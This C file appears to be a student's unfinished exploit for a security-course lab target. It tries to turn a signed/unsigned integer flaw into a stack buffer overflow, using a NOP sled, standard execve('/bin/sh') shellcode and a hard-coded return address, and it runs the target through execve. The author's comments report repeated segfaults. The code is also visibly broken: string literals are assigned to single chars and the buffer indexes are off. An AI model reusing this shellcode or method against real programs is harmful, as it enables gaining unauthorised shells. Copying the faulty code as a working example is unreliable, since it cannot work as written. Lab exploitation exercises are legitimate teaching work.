#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

// need 2800
// sizeof widget_t is 56 bytes
// butts <-- butts?


// I'm pretty sure that the vulnerability has to do with line 47 of target3
// line 47: count = (int)strtoul(argv[1], &in, 10);
//
// strtoul returns an unsigned int long, but count receives it as a signed int 
// we can probably use this for l337 h4x0r1ng

//So I tried doing this /\  and kept getting segfaults whenever the program entered memcpy(). It even segfaulted for 1 <= count < 50. No idea why yet.//I noticed that in the widget_t struct, there is a count variable. Are we supposed to have widget_t.count overwrite count ? Just a thought.
struct widget_t {
  long double p;
  double x;
  double y;
  unsigned long a;
  unsigned long b;
  int count;
  double t;
  double q;
};

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[3000] = "4294967246, "; 
  int i = 0;
	for  (i; i <12; i++) {
		printf("%c", buf[i]);
	}
  for (i; i < (56*48) + 48; i++){    //leave room in buffer for shell code. After for-loop buf[2748] is next empty mem addr; 60 bytes to overflow 
  	int x = 30+i;
  	buf[x] = "\x90";
  }
 	buf[2748] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"  //the 60 bytes that cause overflow
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh"
"\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\xaa\xff\xff\xbf";

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;
  printf("%d\n",sizeof(struct widget_t));
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
